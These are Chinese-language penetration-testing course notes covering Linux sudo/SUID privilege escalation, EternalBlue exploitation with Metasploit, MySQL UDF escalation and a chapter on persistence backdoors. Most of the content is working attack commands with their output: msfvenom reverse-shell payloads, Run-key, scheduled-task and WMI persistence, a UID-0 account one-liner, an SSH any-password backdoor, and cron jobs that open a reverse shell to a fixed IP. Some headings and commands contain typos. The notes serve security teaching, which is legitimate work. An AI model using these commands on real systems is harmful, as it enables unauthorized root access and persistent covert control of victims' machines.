**sudo命令** 用来以其他身份来执行命令，预设的身份为root。在`/etc/sudoers`中设置了可执行sudo指令的用户。若其未经授权的用户企图使用sudo，则会发出警告的邮件给管理员。用户使用sudo时，必须先输入密码，之后有5分钟的有效期限，超过期限则必须重新输入密码。

### 语法

```shell
sudo(选项)(参数)
```

### 选项

```shell
-b：在后台执行指令；
-E：继承当前环境变量
-h：显示帮助；
-H：将HOME环境变量设为新身份的HOME环境变量；
-k：结束密码的有效期限，也就是下次再执行sudo时便需要输入密码；。
-l：列出目前用户可执行与无法执行的指令；
-p：改变询问密码的提示符号；
-s<shell>：执行指定的shell；
-u<用户>：以指定的用户作为新的身份。若不加上此参数，则预设以root作为新的身份；
-v：延长密码有效期限5分钟；
-V ：显示版本信息。
```

#### 2.1.3 错误配置

```bash
test    ALL=(ALL, !root) ALL
```

含义是：允许`test`用户以任意身份（除了`root`）执行任意命令

### 2.2 漏洞复现

**2.2.1 查看sudo版本信息**

版本号为：1.8.9p5 < 1.8.28

```bash
$ sudo -V
Sudo version 1.8.9p5
Sudoers policy plugin version 1.8.9p5
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.9p5
```

**2.2.2 提权**

**sudo -u#id** 指定用户 id 去执行命令，由于可以指定id，所以可以使用-u#-1或者-u#4294967295绕过限制，从而以root身份去执行任意代码

```bash
$ sudo -u#-1 id
uid=0(root) gid=0(root) groups=0(root)
```

## 3. `sudo`配置不当提权

### 3.1 漏洞原理

依然是由于`/etc/sudoers`不规范配置导致

```bash
test    ALL=(ALL:ALL) NOPASSWD:ALL
```

含义是：允许`test`用户以任意身份执行任意命令，且不需要使用`test`的用户密码

### 3.2 漏洞复现

可以看到只要我们使用`sudo`来执行命令，就会以root身份来执行

```bash
$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```

也可以通过其他命令执行获取root shell

```bash
$ sudo -i
root@ubuntusrv2004:~#

sudo find /home -exec sh -i \;
```

## 4. `suid`提权

### 4.1 漏洞原理

`suid`权限：赋予了`suid`权限的文件，在执行的时候会以**文件所有者**的身份来执行

**为指定文件赋予suid权限**

```bash
lonelyor@ubuntusrv2004:~$ touch exec
lonelyor@ubuntusrv2004:~$ chmod u+s,a+x exec
lonelyor@ubuntusrv2004:~$ ll exec
-rwsrwxr-x 1 lonelyor lonelyor 0 Nov  1 12:35 exec*
```

### 4.2 漏洞复现

使用`find`命令搜索拥有suid权限的文件

```bash
lonelyor@ubuntusrv2004:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/vim.basic
/usr/bin/umount
/usr/bin/find
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/su
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
```

我们主要查看`/use/bin`下的可执行二进制文件，可以看到能利用的文件有：`/usr/bin/su、/use/bin/sudo、/use/bin/find`

**`sudo su`提权**

```bash
lonelyor@ubuntusrv2004:~$ sudo su
[sudo] password for lonelyor:
root@ubuntusrv2004:/home/lonelyor#
```

**`find`命令提权**

`-name`指定的文件名必须存在！

```bash
lonelyor@ubuntusrv2004:~$ find / -type f -name abc -exec "whoami" \;
root
```

获取交互式的root shell

```bash
lonelyor@ubuntusrv2004:~$ find / -name abc -exec /bin/sh -p \; -quit
# whoami
root
```

各部分的含义如下：

- `find /`：这是`find`命令的基本格式，表示在根目录（`/`）下查找
- `-name abc`：这个参数指定了要查找的文件或目录的名称，即`abc`
- `-exec /bin/sh -p \;`：这个参数表示对每个找到的文件或目录执行`/bin/sh -p`命令。这里的`\;`表示-exec选项的结束
- `-quit`：这个参数表示在找到第一个匹配项后立即退出

## 5. Windows：CVE-2020-0787

### 5.1 影响版本

```
Microsoft Windows 7 SP1
Windows 8.1，Windows RT 8.1
Windows 10
Windows Server 2008 SP2
Windows Server 2008 R2 SP1
Windows Server 2012，Windows Server 2012 R2
Windows Server 2016，Windows Server 2019
Windows 10版本1607，Windows 10版本1709
Windows 10版本1803，Windows 10版本1809
Windows 10版本1903，Windows 10
```

### 5.2 项目地址

```bash
https://www.hacking8.com/tiquan/windows/CVE-2020-0787.html
https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1
```

### 5.3 漏洞复现

![image-20231101210642893](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231101210642893.png)

## 6. Windows：3.8-CVE-2019-145

### 6.1 漏洞简介

`CVE-2019-1458`是**Win32k**中的特权提升漏洞，**Win32k**组件无法正确处理内存中的对象时，导致**Windows**中存在一个特权提升漏洞。成功利用此漏洞的攻击者可以在内核模式下运行任意代码。然后攻击者可能会安装程序、查看、更改或删除数据；或创建具有完全用户权限的新帐户。

### 6.2 影响版本

```
Microsoft Windows 10 Version 1607 for 32-bit Systems
Microsoft Windows 10 Version 1607 for x64-based Systems
Microsoft Windows 10 for 32-bit Systems
Microsoft Windows 10 for x64-based Systems
Microsoft Windows 7 for 32-bit Systems SP1
Microsoft Windows 7 for x64-based Systems SP1
Microsoft Windows 8.1 for 32-bit Systems
Microsoft Windows 8.1 for x64-based Systems
Microsoft Windows RT 8.1
Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1
Microsoft Windows Server 2008 R2 for x64-based Systems SP1
Microsoft Windows Server 2008 for 32-bit Systems SP2
Microsoft Windows Server 2008 for Itanium-based Systems SP2
Microsoft Windows Server 2008 for x64-based Systems SP2
Microsoft Windows Server 2012
Microsoft Windows Server 2012 R2
Microsoft Windows Server 2016
```

### 6.3 漏洞复现

![image-20231102160340889](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231102160340889.png)

## 7. windows：MS17-010

### 7.1 漏洞简介

永恒之蓝(ms17-010)过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和[服务器](https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065)中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。

### 7.2 漏洞原理

 漏洞出现在Windows SMB v1中的内核态函数srv!SrvOs2FeaListToNt在处理FEA(File Extended Attributes)转换时，在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)上存在缓冲区溢出。函数srv!SrvOs2FeaListToNt在将FEA list转换成NTFEA(Windows NT FEA) list前会调用srv!SrvOs2FeaListSizeToNt去计算转换后的FEA lsit的大小。然后会进行如下操作：

1. srv!SrvOs2FeaListSizeToNt会计算FEA list的大小并更新待转换的FEA list的大小 
2. 因为错误的使用WORD强制类型转换，导致计算出来的待转换的FEA list的大小比真正的FEA list大 
3. 因为原先的总大小计算错误，导致当FEA list被转化为NTFEA list时，会在非分页池导致缓冲区溢出

### 7.3 漏洞范围

+ WindowsNT
+ Windows2000
+ Windows XP
+ Windows 2003
+ Windows Vista
+ Windows 7
+ Windows 8
+ Windows 2008
+ Windows 2008 R2
+ Windows Server 2012 SP0

### 7.4 漏洞复现

**7.4.1 metasploit 扫描主机是否存在永恒之蓝漏洞**

扫描结果可看出目标主机大概率可被渗透

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 192.168.231.150
RHOST => 192.168.231.150
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit 

[+] 192.168.231.150:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.231.150:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**7.4.2 metasploit 模块开始渗透**

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOTST 192.168.231.150
RHOTST => 192.168.231.150
# 由于默认已配置了payload，所以直接exploit即可
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit 
......
meterpreter > shell
Process 2728 created.
Channel 1 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

## 8. Mysql UDF 提权

### 8.1 认识UDF

UDF（User-Defined-Function）用户自定义函数，为了方便开发者能够自己写所需的函数功能，以达到扩充的目的，调用方式与一般自带的函数是相同的

udf 文件后缀一般为 so,dll、由C、C++编写

**Linux 系统使用so文件、Windows系统使用dll文件**

### 8.2 为什么UDF能提权

 UDF提权主要是因为udf.dll文件，攻击者通过编写调用cmd或者shell的udf.dll文件，并且导入到一个指定的文件夹目录下，创建一个指向udf.dll的自定义函数，从而在数据库中的查询就等价于在cmd或者shell中执行命令。

> 补充一下动态链接库的概念，大家还可以网上搜索更多的信息
>
> 动态链接库（Dynamic Link Library，缩写为DLL）是一个可以被其它应用程序共享的程序模块，其中封装了一些可以被共享的例程和资源。使用DLL的主要目的就是为了共享代码，DLL的代码可以被所有的Windows应用程序共享。

   在一般渗透过程中，拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了。由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们通过mysql最终获得管理员权限。 

### 8.3 使用UDF提权的利用条件

这个内容主要是看什么条件下可以利用UDF提权，主要满足下面几点：

+ 获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。

+ 拥有将udf.dll写入相应目录的权限。

udf利用的其中一步，是要将我们的udf.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/ea61da103831a7ea94180f4e79aaf231569f7c6d.png@1256w_238h_!web-article-pic.avif)

**注意：**当我们在MySQL中创建了可执行系统命令的函数之后，用户身份依然是`mysql`，需要使用SUID提权的方式拿到root权限

### 8.4 本地Mysql UDF提权（基础版）

#### 8.4.1 获取UDF提权文件

我们可以从sqlmap和metasploit中获取UDF文件

##### sqlmap UDF文件获取

sqlmap UDF文件存储路径

```bash
┌──(root㉿pinginglab)-[~]
└─# tree /usr/share/sqlmap/data/udf/mysql
/usr/share/sqlmap/data/udf/mysql
├── linux
│   ├── 32
│   │   └── lib_mysqludf_sys.so_
│   └── 64
│       └── lib_mysqludf_sys.so_
└── windows
    ├── 32
    │   └── lib_mysqludf_sys.dll_
    └── 64
        └── lib_mysqludf_sys.dll_
```

sqlmap中的UDF提权文件需要先转义才能使用

```bash
┌──(root㉿pinginglab)-[~]
└─# python3 /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o udf.so
```

##### Metasploit UDF文件获取

这里我们需要注意版本，尽量使用符合MySQL的版本。如果没有的话推荐使用sqlmap的UDF文件

```bash
┌──(root㉿pinginglab)-[~]
└─# searchsploit mysql |grep UDF
MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                                            | linux/local/1181.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                                           | linux/local/1518.c
MySQL 4/5/6 - UDF for Command Execution                                                                           | linux/local/7856.txt
```

Metasplit UDF文件要做gcc编译为so文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# cp /usr/share/exploitdb/exploits/linux/local/1518.c ./
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# ls
1518.c
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# gcc -g -c 1518.c
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# ls
1518.c  1518.o
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# gcc -g -shared -o  raptor_udf.so 1518.o -lc
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# ls
1518.c  1518.o  raptor_udf.so
```

#### 8.4.2 将UDF文件放到MySQL插件目录

**查看MySQL的插件目录**

```bash
mysql> show variables like "%plugin_dir%";
+---------------+--------------------------+
| Variable_name | Value                    |
+---------------+--------------------------+
| plugin_dir    | /usr/lib64/mysql/plugin/ |
+---------------+--------------------------+
1 row in set (0.00 sec)
```

**将UDF文件移动到这个目录并赋予权限**

```bash
[root@localhost plugin]# ll udf.so
-rwxrwxrwx. 1 root root 8040 11月  2 10:21 udf.so
```

**关闭SELINUX**

```bash
[root@localhost plugin]# setenforce 0
```

#### 8.4.3 开始提权

##### 本地查看共享库的可用函数

```bash
[root@localhost plugin]# nm -D udf.so
0000000000201788 A __bss_start
                 w __cxa_finalize
0000000000201788 A _edata
0000000000201798 A _end
                 U fgets
0000000000001178 T _fini
                 U fork
                 U free
                 U getenv
                 w __gmon_start__
0000000000000ba0 T _init
                 w _Jv_RegisterClasses
000000000000101a T lib_mysqludf_sys_info
0000000000000da4 T lib_mysqludf_sys_info_deinit
0000000000001047 T lib_mysqludf_sys_info_init
                 U malloc
                 U mmap
                 U pclose
                 U popen
                 U realloc
                 U setenv
                 U strcpy
                 U strncpy
0000000000000dac T sys_bineval
0000000000000dab T sys_bineval_deinit
0000000000000da8 T sys_bineval_init
                 U sysconf
0000000000000e46 T sys_eval
0000000000000da7 T sys_eval_deinit
0000000000000f2e T sys_eval_init
0000000000001066 T sys_exec
0000000000000da6 T sys_exec_deinit
0000000000000f57 T sys_exec_init
00000000000010f7 T sys_get
0000000000000da5 T sys_get_deinit
0000000000000fea T sys_get_init
000000000000107a T sys_set
00000000000010e8 T sys_set_deinit
0000000000000f80 T sys_set_init
                 U system
                 U waitpid
```

##### 开始提权

```bash
mysql> use mysql;
Database changed
mysql> create function sys_eval returns string soname "udf.so";
Query OK, 0 rows affected (0.00 sec)

mysql> select sys_eval('chmod u+s /usr/bin/find');
+--------------------------------------------------------------------------+
| sys_eval('chmod u+s /usr/bin/find')                                      |
+--------------------------------------------------------------------------+
| NULL                                                                     |
+--------------------------------------------------------------------------+
1 row in set (0.20 sec)

[root@localhost ~]# touch abc
[root@localhost ~]# find abc -exec "/bin/sh" \;
sh-4.4# whoami
```

### 8.5 MySQL UDF提权（高级版）

> 这个版本建立在非本地的环境下，并且无法直接将UDF文件写入到MySQL的plugin文件夹

#### 8.5.1 获取UDF文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# cp /usr/share/exploitdb/exploits/linux/local/1518.c ./
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# ls
1518.c
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# gcc -g -c 1518.c
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# ls
1518.c  1518.o
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# gcc -g -shared -o  raptor_udf.so 1518.o -lc
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# ls
1518.c  1518.o  raptor_udf.so
```

#### 8.5.2 下载UDF文件

启动apache服务并将UDF文件移动到`/var/www/html`

```bash
┌──(root㉿pinginglab)-[/var/www/html]
└─# mv /home/pinginglab/test/udf.so ./

┌──(root㉿pinginglab)-[/var/www/html]
└─# systemctl start apache2.service

wget http://192.168.231.129/udf.so
converted 'http://192.168.231.129/udf.so' (ANSI_X3.4-1968) -> 'http://192.168.231.129/udf.so' (UTF-8)
--2023-11-03 02:10:38--  http://192.168.231.129/udf.so
Connecting to 192.168.231.129:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17240 (17K)
Saving to: 'udf.so'

udf.so              100%[=====================>]  16.84K  --.-KB/s   in 0s     

2023-11-03 02:10:38 (46.5 MB/s) - 'udf.so' saved [17240/17240]
```

#### 8.5.3 将UDF文件写入plugin文件夹

```bash
mysql> use mysql
use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

# 创建数据表，字段line，类型为 blob（二进制大对象）
mysql> create table myfunc(line blob);
create table myfunc(line blob);
Query OK, 0 rows affected (0.00 sec)

# 将 /var/www/html/udf.so 文件的内容插入到数据表 myfunc 中
mysql> insert into myfunc values(load_file('/var/www/html/udf.so'));
insert into myfunc values(load_file('/var/www/html/udf.so'));
Query OK, 1 row affected (0.02 sec)

# 查看MySQL插件路径
mysql> show variables like '%plugin%';
show variables like '%plugin%';
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.00 sec)

# 将数据表 myfunc 的内容写到 /usr/lib/mysql/plugin/udf.so 中
mysql> select * from myfunc into dumpfile '/usr/lib/mysql/plugin/udf.so';
select * from myfunc into dumpfile '/usr/lib/mysql/plugin/udf.so';
Query OK, 1 row affected (0.01 sec)
```

#### 8.5.4 开始提权

```bash
# 本地查看库文件的可用函数
┌──(root㉿pinginglab)-[/var/www/html]
└─# nm -D udf.so                             
                 w __cxa_finalize@GLIBC_2.2.5
0000000000001109 T do_system
000000000000114d T do_system_init
                 w __gmon_start__
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
                 U system@GLIBC_2.2.5

# 创建函数 do_system 并返回整形，调用的库文件为：udf.so
mysql> create function do_system returns integer soname 'udf.so';       
create function do_system returns integer soname 'udf.so';
Query OK, 0 rows affected (0.00 sec)

# 利用该函数执行系统命令为 find二进制文件 赋予SUID权限
mysql> select do_system('chmod u+s /usr/bin/find');
select do_system('chmod u+s /usr/bin/find');
+--------------------------------------+
| do_system('chmod u+s /usr/bin/find') |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row in set (0.01 sec)

# 开始提权并获取root交互shell
www-data@Raven:/var/www/html$ touch abc
touch abc

www-data@Raven:/var/www/html$ find abc -exec "/bin/sh" \;
find abc -exec "/bin/sh" \;
# whoami
whoami
root
```

# 第四章：维持访问技术

> 此技术一般用于在获取了root权限之后，建立后门以便黑客后续使用

## 1. 粘滞键后门

核心思想：将`sethc.exe`替换为`cmd.exe`

重命名或删除原粘滞键程序：`sethc.exe`，将`cmd.exe`程序复制一份并重命名为`sethc.exe`

```bash
C:\Windows\system32>whoami
lonelyor-win10\lonelyor

C:\Windows\system32>rename sethc.exe sethc.exe.bak

C:\Windows\system32>copy cmd.exe sethc.exe
已复制         1 个文件。
```

将被替换的`sethc.exe`的文件所有者改为`Administrator`，并赋予完全控制权限

![image-20231104170150512](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231104170150512.png)

## 2. 注册表启动后门

### 2.1 生成后门木马

+ `-p --payload` ：指定payload
+ `-e --encoder`：指定编码
+ `-i --iterations `：指定编码次数
+ `-f --format`：指定输出格式
+ `-o --output`：指定输出的文件名

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.231.129 lport=4444 -e x86/shikata_ga_nai -i 3 -b '\00' -f exe -o shell.exe
```

### 2.2 Kali开始监听

```bash
msf6 > use /multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set LHOST 192.168.231.129
LHOST => 192.168.231.129

msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > run 
```

### 2.3 Kali搭建web服务器提供下载途径

Kali启动web服务器并将木马放在web服务器的跟路径下

### 2.4 使用注册表的方式激活木马

- `REG ADD`：这是一个用于添加注册表项或设置注册表项的值的命令。
- `"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"`：这是注册表的一个路径，它定义了在Windows启动时需要运行的程序。
- `/v hack`：这是创建一个名为“hack”的新值。
- `/t REG_SZ`：这是定义新值的类型，`REG_SZ`表示它是一个字符串值。
- `/d "c:\User\Lonelyor\Downloads\shell.exe"`：这是设置新值的数据，指向一个名为"shell.exe"的程序的路径。

当用户在登录系统的时候，木马会自动被执行

```bash
C:\Windows\system32>REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v hack /t REG_SZ /d "C:\Users\lonelyor\Downloadsshell.exe"
操作成功完成。
```

### 2.5 激活木马

![image-20231104215202677](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231104215202677.png)

## 3. 计划任务后门

**3.1 DOS命令创建计划任务**

每分钟执行一次程序：`C:\hack\shell.exe`

```bash
C:\Users\lonelyor>schtasks /Create /tn test /tr C:\hack\shell.exe /sc minute /mo 1
成功: 成功创建计划任务 "test"。
```

**3.2 查看所有定时任务**

```bash
C:\Users\lonelyor>schtasks

文件夹: \
任务名                                   下次运行时间           模式
======================================== ====================== ===============
test                                     2023/11/5 16:23:00     正在运行
```

**3.3 删除指定定时任务**

```bash
C:\Users\lonelyor>schtasks /delete /tn test
警告: 确实要删除任务 "test" 吗 (Y/N )? y
成功: 计划的任务 "test" 被成功删除。
```

## 4. LogonScript后门

使用此方法植入后门可绕过安全工具的检测

注意键名最好不要改，在用户重新登录时会自动启动

```bash
REG ADD "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\hack1\shell.exe"
```

## 5. Windows 基础概念

WMI 是基于 Windows 的操作系统上管理数据和操作的基础结构。用户可以使用 WMI 管理本地和远程计算机。WMI 是 Windows 操作系统的功能，无须安装就可以使用。某些 Provider (提供程序) 的安装会由系统配置而定

依托于WMI来制造的后门可以做到**无文件、无进程**

## 6. 本地调用无后门

**powershell 脚本**

使用时注意修改指定的木马文件路径，并且用管理员的身份允许powershell

```powershell
$filterName = 'lonelyorfn'
$consumerName = 'lonelyorcsn'
$exePath = 'C:\hack2\shell.exe'
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE
TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=
$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=
$WMIEventFilter;Consumer=$WMIEventConsumer}
```

## 7. WMI检测与删除

**7.1 WMI 检测**

```powershell
# Reviewing WMI Subscriptions using Get-WMIObject
# Event Filter
Get-WMIObject -Namespace root\Subscription -Class __EventFilter

# Event Consumer
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer

# Binding
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

**7.2 WMI 删除**

```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='lonelyorfn'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='lonelyorfn'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "Name='lonelyorfn'" | Remove-WmiObject -Verbose
```

## 8. 一句话添加root用户

成功率不大：因为是通过指定UID为0来做到root权限的，通常系统会报错：`useradd：UID 0 并不唯一`

```bash
useradd -p `openssl passwd -1 -salt 'lsof' admin` -u 0 -g root -G root -s /bin/bash -d /usr/bin/lsof lsof
```

```
useradd 添加用户
-p `openssl passwd -1 -salt 'lsof' admin` 这个里面的指的是设置用户的密码，里面的lsof差不多是密钥之类的，可以随便写， admin是明文密码
-u 0 -o 添加一个uid为 0的用户 就相对于root级别的了
-g root -G root 将用户添加到root组
-s /bin/bash 指定新建用户的shell路径
-d /usr/bin/lsof 新建用户的主目录，可以自己定义
lsof 新建的用户的用户名
```

## 9. SSH软连接后门

### 01 后门命令

------

经典后门：对sshd建立软链接，即可使用任意密码登录。

1、创建后门

ln -sf /usr/sbin/sshd /路径名/su; /路径名/su -oPort=端口号

```bash
 ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345
 # 记得关闭防火墙或者防火墙放行该端口
```

2、任意密码登

ssh用户名@x.x.x.x -p 端口号

### 02 原理

------

在sshd服务配置启用PAM认证的前提下，PAM配置文件中控制标志为sufficient时，只要pam_rootok模块检测uid为0（root）即可成功认证登录。

通俗点来说，一是sshd服务启用PAM认证机制，在/etc/ssh/sshd_config文件中，设置UsePAM 为yes。如果不启用PAM，系统严格验证用户密码，不能建立后门。

二是在/etc/pam.d/目录下，对应文件里包含"auth sufficient pam_rootok.so"配置，只要PAM配置文件中包含此配置即可SSH任意密码登录。

![img](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/webp.webp)

直接启动/usr/sbin/sshd,默认使用/etc/pam.d/sshd的pam配置文件，因而不能建立任意密码登录的后门。

而通过软链接的方式，实质上PAM认证是通过软链接的文件名（如：/tmp/su,/home/su），在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)。

#### sshd_config配置

![img](https:////upload-images.jianshu.io/upload_images/8628147-66f927c603547585?imageMogr2/auto-orient/strip|imageView2/2/w/554/format/webp)

#### PAM配置文件

![img](https:////upload-images.jianshu.io/upload_images/8628147-48290cf90684bd26?imageMogr2/auto-orient/strip|imageView2/2/w/554/format/webp)

### 03 利用

------

使用命令创建后门；通过前后对比，可以看到开启了12345端口并处于监听状态。

![img](https:////upload-images.jianshu.io/upload_images/8628147-5138cb9af3d0d15e?imageMogr2/auto-orient/strip|imageView2/2/w/813/format/webp)

在cmder中连接ssh，输入任意密码，成功登录。

![img](https:////upload-images.jianshu.io/upload_images/8628147-d767d6470f37c9a5?imageMogr2/auto-orient/strip|imageView2/2/w/813/format/webp)

## 10. SUID权限维持

### 10.1 原理

主要原理是通过以ROOT的身份对`/bin/bash`赋予SUID权限，当我们使用普通用户的身份来获取`shell`的时候就可以成功拿到root权限

### 10.2 提权

```bash
# 查找 /bin/bash 文件
root@ubuntusrv1604:/home/lonelyor# whereis /bin/bash
bash: /bin/bash /etc/bash.bashrc /usr/share/man/man1/bash.1.gz
root@ubuntusrv1604:/home/lonelyor# cp /bin/bash /tmp/.bash
# 为该文件赋予 SUID 和读取、执行权限
root@ubuntusrv1604:/home/lonelyor# chmod 4755 /tmp/.bash
root@ubuntusrv1604:/home/lonelyor# su lonelyor
lonelyor@ubuntusrv1604:~$ /tmp/.bash -p
.bash-4.3# whoami
root
```

## 11.  任务计划后门

### 11.1 原理

使用计划任务周期性的回弹shell

```
crontab -l | { cat; echo "*/1 * * * * bash -i >& /dev/tcp/192.168.44.128/2333 0>&1"; } | crontab -
#使用crontab -l 或cat时有隐藏效果
(crontab -l;printf "*/1 * * * * bash -i >& /dev/tcp/192.168.44.128/5555 0>&1;\rno crontab for `whoami`%100c\n")|crontab -
```

# 第五章：信息搜集技术

## 1. Windows信息搜集

### 1.1 主机信息搜集

查看操作系统的详细信息（包括补丁信息）

```bash
C:\Users\19374>systeminfo

Host Name:                 WEIJAY_HOST
OS Name:                   Microsoft Windows 11 专业版
OS Version:                10.0.22621 N/A Build 22621
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          1937488091@qq.com
Registered Organization:
Product ID:                00331-20020-00000-AA351
Original Install Date:     2023/5/8, 17:22:48
System Boot Time:          2023/10/22, 15:57:06
System Manufacturer:       MECHREVO
System Model:              Kuangshi E Series GS7AG0R
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 154 Stepping 3 GenuineIntel ~2300 Mhz
BIOS Version:              American Megatrends International, LLC. N.1.02MRO05, 2022/8/2
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             zh-cn;Chinese (China)
Input Locale:              zh-cn;Chinese (China)
Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi
Total Physical Memory:     16,128 MB
Available Physical Memory: 1,792 MB
Virtual Memory: Max Size:  20,736 MB
Virtual Memory: Available: 3,047 MB
Virtual Memory: In Use:    17,689 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WEIJAY_HOST
# 操作系统补丁信息
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB5030651
                           [02]: KB5012170
                           [03]: KB5026039
